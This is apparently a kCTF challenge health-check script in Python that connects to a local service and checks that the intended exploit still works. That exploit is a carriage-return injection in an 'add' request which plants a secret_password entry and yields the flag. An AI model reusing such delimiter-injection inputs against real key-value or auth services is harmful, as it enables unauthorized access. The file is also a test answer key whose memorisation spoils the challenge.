#!/usr/bin/env python3
# Copyright 2024 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

import pwnlib.tubes


def handle_pow(r):
  print(r.recvuntil(b'python3 '))
  print(r.recvuntil(b' solve '))
  challenge = r.recvline().decode('ascii').strip()
  p = pwnlib.tubes.process.process(['kctf_bypass_pow', challenge])
  solution = p.readall().strip()
  r.sendline(solution)
  print(r.recvuntil(b'Correct\n'))


r = pwnlib.tubes.remote.remote('127.0.0.1', 1337)
print(r.recvuntil('== proof-of-work: '))
if r.recvline().startswith(b'enabled'):
  handle_pow(r)


def send_request(request):
  encoded_request = request.encode('utf-8').hex()
  r.sendline(encoded_request.encode())
  encoded_response = r.recvline().decode()
  return bytes.fromhex(encoded_response).decode('utf-8')


def check():
  # === Non-working trial ===
  if 'fail' not in send_request('get secret_flag'):
    return 1
  if 'fail' not in send_request('auth x get secret_flag'):
    return 1
  # === Non-working trial - tab ===
  if 'fail' in send_request('add \tsecret_password x'):
    return 1
  if 'fail' not in send_request('auth x get secret_flag'):
    return 1
  # === Size limitation ===
  if 'fail' in send_request('add x ' + ('x' * 5120)):
    return 1
  if 'fail' not in send_request('add x ' + ('x' * 5120)):
    return 1
  # === Working solution ===
  if 'fail' in send_request('add x x\rsecret_password:x'):
    return 1
  if 'CTF{' not in send_request('auth x get secret_flag'):
    return 1
  return 0


exit(check())
